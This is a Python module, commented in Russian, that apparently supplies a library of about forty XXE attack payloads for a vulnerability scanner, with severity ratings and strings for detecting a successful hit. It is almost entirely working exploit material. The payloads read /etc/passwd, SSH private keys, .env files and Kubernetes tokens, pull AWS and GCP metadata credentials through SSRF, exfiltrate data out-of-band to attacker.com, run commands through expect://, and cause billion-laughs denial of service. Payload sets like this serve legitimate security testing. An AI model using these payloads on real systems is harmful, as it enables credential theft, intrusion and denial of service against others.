#!/usr/bin/env python3
"""
XXE (XML External Entity) Payload-ы для тестирования уязвимостей
Используется только в образовательных целях на собственных ресурсах
"""


def get_xxe_payloads():
    """Возвращает список XXE payload-ов для тестирования"""
    return [
        # Базовые XXE payload-ы для чтения файлов
        {
            'name': 'Basic XXE File Read',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            'detection': ['root:', 'bin/', '/nologin'],
            'severity': 'High',
            'description': 'Базовая XXE уязвимость для чтения локальных файлов'
        },
        
        # XXE для чтения Windows файлов
        {
            'name': 'XXE Windows File Read',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>''',
            'detection': ['[windows]', '[fonts]', 'C:\\'],
            'severity': 'High',
            'description': 'XXE для чтения Windows конфигурационных файлов'
        },

        # XXE для чтения конфигов приложений
        {
            'name': 'XXE Config File Read',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/config.xml">]>
<root>&xxe;</root>''',
            'detection': ['password', 'key', 'secret', 'token', 'api'],
            'severity': 'High',
            'description': 'XXE для чтения конфигурационных файлов приложения'
        },

        # XXE для чтения env файлов
        {
            'name': 'XXE .env File Read',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.env">]>
<root>&xxe;</root>''',
            'detection': ['DATABASE_URL', 'API_KEY', 'SECRET', 'PASSWORD'],
            'severity': 'High',
            'description': 'XXE для чтения .env файлов с переменными окружения'
        },

        # XXE для SSRF (Server-Side Request Forgery)
        {
            'name': 'XXE SSRF - Local',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8000/admin">]>
<root>&xxe;</root>''',
            'detection': ['403', '401', 'admin', 'dashboard'],
            'severity': 'High',
            'description': 'XXE для SSRF атаки на локальные сервисы'
        },

        # XXE для SSRF на внутренние IP
        {
            'name': 'XXE SSRF - Internal IP',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/status">]>
<root>&xxe;</root>''',
            'detection': ['router', 'admin', 'status'],
            'severity': 'High',
            'description': 'XXE для сканирования внутренней сети'
        },

        # Blind XXE (когда нет прямого вывода)
        {
            'name': 'Blind XXE - OOB',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=test">]>
<root>&xxe;</root>''',
            'detection': ['XXE', 'External Entity'],
            'severity': 'High',
            'description': 'Blind XXE через Out-of-Band данные'
        },

        # Billion Laughs Attack (DoS)
        {
            'name': 'Billion Laughs - DoS',
            'payload': '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>''',
            'detection': ['timeout', 'hang', 'CPU', 'memory'],
            'severity': 'Medium',
            'description': 'DoS атака через расширение XML сущностей'
        },

        # Parameter Entity XXE
        {
            'name': 'Parameter Entity XXE',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfili SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfili;
]>
<root>test</root>''',
            'detection': ['root:', 'exfil', 'attacker'],
            'severity': 'High',
            'description': 'XXE с использованием Parameter Entities'
        },

        # XXE с кодировкой
        {
            'name': 'XXE UTF-8 Encoded',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
            'detection': ['root', 'bin', 'daemon'],
            'severity': 'High',
            'description': 'XXE с явной кодировкой UTF-8'
        },

        # XXE для доступа к сокетам
        {
            'name': 'XXE Socket Access',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>''',
            'detection': ['uid=', 'gid=', 'groups='],
            'severity': 'Critical',
            'description': 'XXE для выполнения команд через expect протокол'
        },

        # XXE для доступа к Java объектам
        {
            'name': 'XXE Java Jar Protocol',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/poc.jar!/poc.txt">]>
<root>&xxe;</root>''',
            'detection': ['java', 'jar', 'class'],
            'severity': 'High',
            'description': 'XXE через Java jar протокол'
        },

        # XXE для фильтрации символов
        {
            'name': 'XXE Character Filter Bypass',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>''',
            'detection': ['base64', 'encoded', 'root'],
            'severity': 'High',
            'description': 'XXE с обходом фильтров символов'
        },

        # Nested XXE
        {
            'name': 'Nested XXE',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe1 SYSTEM "file:///etc/passwd">
  <!ENTITY % xxe2 "<!ENTITY xxe3 SYSTEM 'http://localhost:8000/%xxe1;'>">
  %xxe2;
]>
<root>&xxe3;</root>''',
            'detection': ['nested', 'entity'],
            'severity': 'High',
            'description': 'Вложенная XXE с множественными сущностями'
        },

        # XXE для SOAP сервисов
        {
            'name': 'XXE SOAP Service',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soap:Body>
    <root>&xxe;</root>
  </soap:Body>
</soap:Envelope>''',
            'detection': ['root:', 'soap', 'xmlns'],
            'severity': 'High',
            'description': 'XXE в SOAP веб-сервисах'
        },

        # XXE для чтения исходного кода приложения
        {
            'name': 'XXE Source Code Read',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/server.py">]>
<root>&xxe;</root>''',
            'detection': ['def ', 'import ', 'class ', 'python'],
            'severity': 'High',
            'description': 'XXE для чтения исходного кода приложения'
        },

        # XXE для извлечения конфигов базы данных
        {
            'name': 'XXE Database Config',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">]>
<root>&xxe;</root>''',
            'detection': ['mysql', '[mysqld]', 'password', 'user'],
            'severity': 'High',
            'description': 'XXE для чтения конфигов базы данных'
        },

        # XXE через php://expect для RCE
        {
            'name': 'XXE PHP Expect RCE',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>
<root>&xxe;</root>''',
            'detection': ['www-data', 'root', 'nobody', 'apache'],
            'severity': 'Critical',
            'description': 'XXE через PHP expect для Remote Code Execution'
        },

        # XXE через php://input (для загрузки файлов)
        {
            'name': 'XXE PHP Input Stream',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]>
<root>&xxe;</root>''',
            'detection': ['POST', 'php', 'stream'],
            'severity': 'High',
            'description': 'XXE через PHP input stream'
        },

        # XXE для NoSQL инъекций
        {
            'name': 'XXE NoSQL Read',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/lib/mongodb/mongod.conf">]>
<root>&xxe;</root>''',
            'detection': ['mongodb', '[security]', 'bindIp'],
            'severity': 'High',
            'description': 'XXE для чтения MongoDB конфигов'
        },

        # XXE для Docker конфигов
        {
            'name': 'XXE Docker Config',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.dockerenv">]>
<root>&xxe;</root>''',
            'detection': ['docker', '.dockerenv', 'container'],
            'severity': 'Medium',
            'description': 'XXE для обнаружения Docker окружения'
        },

        # XXE через файло-обход (Path Traversal в XXE)
        {
            'name': 'XXE Path Traversal',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///../../../etc/passwd">]>
<root>&xxe;</root>''',
            'detection': ['root:', '../', '..\\'],
            'severity': 'High',
            'description': 'XXE с использованием path traversal для обхода ограничений'
        },

        # XXE для AWS метаданных
        {
            'name': 'XXE AWS Metadata',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>''',
            'detection': ['aws', 'credential', 'iam', 'security'],
            'severity': 'Critical',
            'description': 'XXE для извлечения AWS credentials из метаданных'
        },

        # XXE для GCP метаданных
        {
            'name': 'XXE GCP Metadata',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity">]>
<root>&xxe;</root>''',
            'detection': ['gcp', 'google', 'metadata', 'token'],
            'severity': 'Critical',
            'description': 'XXE для извлечения GCP токенов'
        },

        # XXE для локальной сети сканирования
        {
            'name': 'XXE Network Enumeration',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:80/">]>
<root>&xxe;</root>''',
            'detection': ['router', 'gateway', '192.168', 'admin'],
            'severity': 'High',
            'description': 'XXE для перечисления устройств в локальной сети'
        },

        # XXE для обхода WAF фильтров
        {
            'name': 'XXE WAF Bypass - Null Byte',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd%00.jpg">]>
<root>&xxe;</root>''',
            'detection': ['root:', 'null', 'bypass'],
            'severity': 'High',
            'description': 'XXE с null byte для обхода WAF фильтров'
        },

        # XXE с использованием CDATA
        {
            'name': 'XXE CDATA Section',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><![CDATA[&xxe;]]></root>''',
            'detection': ['localhost', 'hostname'],
            'severity': 'High',
            'description': 'XXE с использованием CDATA секций'
        },

        # XXE для чтения SSH ключей
        {
            'name': 'XXE SSH Keys Read',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.ssh/id_rsa">]>
<root>&xxe;</root>''',
            'detection': ['BEGIN RSA', 'BEGIN OPENSSH', 'private key'],
            'severity': 'Critical',
            'description': 'XXE для чтения приватных SSH ключей'
        },

        # XXE для Kubernetes конфигов
        {
            'name': 'XXE Kubernetes Config',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">]>
<root>&xxe;</root>''',
            'detection': ['kubernetes', 'token', 'secret', 'eyJ'],
            'severity': 'Critical',
            'description': 'XXE для чтения Kubernetes токенов'
        },

        # XXE для доступа к /proc файловой системе
        {
            'name': 'XXE /proc Filesystem',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]>
<root>&xxe;</root>''',
            'detection': ['linux', 'kernel', 'gcc', 'proc'],
            'severity': 'High',
            'description': 'XXE для чтения /proc/версии и информации ядра'
        },

        # XXE для извлечения версии приложения
        {
            'name': 'XXE Version Disclosure',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/VERSION">]>
<root>&xxe;</root>''',
            'detection': ['version', '1.0', '2.0', 'v'],
            'severity': 'Low',
            'description': 'XXE для получения информации о версии приложения'
        },

        # XXE с использованием внешних DTD
        {
            'name': 'XXE External DTD',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<root>&xxe;</root>''',
            'detection': ['DOCTYPE', 'SYSTEM', 'attacker.com'],
            'severity': 'High',
            'description': 'XXE с использованием внешних DTD определений'
        },

        # XXE для JSON API endpoints
        {
            'name': 'XXE JSON API',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/config.json">]>
<root>&xxe;</root>''',
            'detection': ['json', '{', '"', 'key'],
            'severity': 'High',
            'description': 'XXE для чтения JSON конфигов API'
        },

        # XXE для Windows реестра (не прямой доступ, но может раскрыть инфо)
        {
            'name': 'XXE Windows Registry Info',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///Windows/System32/config/SYSTEM">]>
<root>&xxe;</root>''',
            'detection': ['registry', 'windows', 'system'],
            'severity': 'High',
            'description': 'XXE для попытки доступа к Windows реестру'
        },

        # XXE через base64 кодирование
        {
            'name': 'XXE Base64 Encoded',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data:text/plain;base64,L2V0Yy9wYXNzd2Q=">
]>
<root>&xxe;</root>''',
            'detection': ['base64', 'data:', 'encoded'],
            'severity': 'High',
            'description': 'XXE с использованием base64 кодирования данных'
        },

        # XXE для обнаружения брандмауэра
        {
            'name': 'XXE Firewall Detection',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:9000/status">]>
<root>&xxe;</root>''',
            'detection': ['timeout', 'refused', 'blocked', 'denied'],
            'severity': 'Medium',
            'description': 'XXE для обнаружения внутренних сервисов за брандмауэром'
        },

        # XXE для TXT рекордов DNS
        {
            'name': 'XXE DNS TXT Records',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.local/dns?domain=example.com">]>
<root>&xxe;</root>''',
            'detection': ['dns', 'txt', 'record', 'local'],
            'severity': 'Medium',
            'description': 'XXE для запроса DNS TXT записей'
        },

        # XXE для обхода IP брандмауэра через IPv6
        {
            'name': 'XXE IPv6 Bypass',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://[::1]:8000/admin">]>
<root>&xxe;</root>''',
            'detection': ['ipv6', '::1', 'localhost', 'admin'],
            'severity': 'High',
            'description': 'XXE через IPv6 адреса для обхода фильтров'
        },

        # XXE с множественными entity определениями
        {
            'name': 'XXE Multiple Entities',
            'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe1 SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "file:///etc/hostname">
  <!ENTITY xxe3 SYSTEM "file:///etc/hosts">
]>
<root>&xxe1;&xxe2;&xxe3;</root>''',
            'detection': ['root:', 'localhost', 'hosts'],
            'severity': 'High',
            'description': 'XXE с множественными параллельными entity'
        },

    ]


def get_xxe_payloads_count():
    """Возвращает количество XXE payload-ов"""
    return len(get_xxe_payloads())


def get_xxe_payloads_by_severity(severity='High'):
    """Возвращает XXE payload-ы по уровню серьезности"""
    payloads = get_xxe_payloads()
    return [p for p in payloads if p['severity'] == severity]


def get_xxe_simple_payloads():
    """Возвращает только строки payload-ов (без метаданных)"""
    return [p['payload'] for p in get_xxe_payloads()]
